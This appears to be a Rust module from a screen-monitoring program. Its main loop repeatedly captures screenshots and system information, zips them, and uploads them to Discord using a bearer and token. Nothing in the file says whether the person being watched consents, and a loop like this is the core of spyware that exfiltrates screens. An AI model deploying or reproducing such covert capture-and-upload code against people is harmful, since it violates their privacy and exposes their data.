use super::{
    discord,
    system::System,
    zip::Zip,
    files, global
};

pub(crate) struct Thread {
    running: bool
}

impl Thread {
    // Initialize a new thread
    pub fn new() -> Self {
        Self {
            running: false
        }
    }

    // Stop the thread from running
    pub fn stop(&mut self) {
        self.running = false;
    }

    // Start the thread
    pub fn start(mut self, bearer: &str, token: &str) {
        self.running = true;

        // Clone the token for thread
        let token: String = token.to_string().clone();
        let bearer: String = bearer.to_string().clone();

        // Spawn the thread
        std::thread::spawn(move || {
            self.main(&bearer, &token);
        }).join().expect("failed to spawn main loop thread");
    }

    // Main loop
    fn main(&self, bearer: &str, token: &str) {
        // Initialize sys and zip variables
        let mut sys: System = System::new();
        let mut zip: Zip = Zip::new();

        // Until the user presses the stop button...
        while self.running {
            // Start after 10 seconds
            std::thread::sleep(std::time::Duration::from_secs(10));
            
            // Get the system info then add it to a file
            let sys_info: Vec<u8> = get_sys_info(&mut sys);
            add_sys_info(&mut zip, &sys_info);

            // Capture the image then add it to the zip file
            let image: Vec<u8> = capture_image();
            add_screenshot(&mut zip, &image);

            // Encode the image data
            let image_data: String = files::encode_png(image);
            let sys_info_data: String = files::encode_json(sys_info);

            // Send the files to discord
            discord::send_files(bearer, token, &image_data, &sys_info_data);

            // Repeat after 20 to 50 seconds
            std::thread::sleep(std::time::Duration::from_secs(50));
        }
    }
}

// Add the screenshot to the zip file
fn add_screenshot(zip: &mut Zip, data: &Vec<u8>) {
    match zip.add_file(&format!("{}.png", global::get_date_time()), data) {
        Ok(_) => (),
        Err(e) => panic!("Error: {}", e)
    }
}

// Capture the image
fn capture_image() -> Vec<u8> {
    return match files::capture_image() {
        Ok(f) => f,
        Err(e) => panic!("Error: {}", e)
    };
}

// Get the system info
fn get_sys_info(sys: &mut System) -> Vec<u8> {
    return match serde_json::to_vec(&sys.info()){
        Ok(buf) => buf,
        Err(e) => panic!("Error: {}", e)
    };
}

// Add the sysinfo to the zip file
fn add_sys_info(zip: &mut Zip, data: &Vec<u8>) {
    match zip.add_file(&format!("{}.json", global::get_date_time()), data) {
        Ok(_) => (),
        Err(e) => panic!("Error: {}", e)
    }
}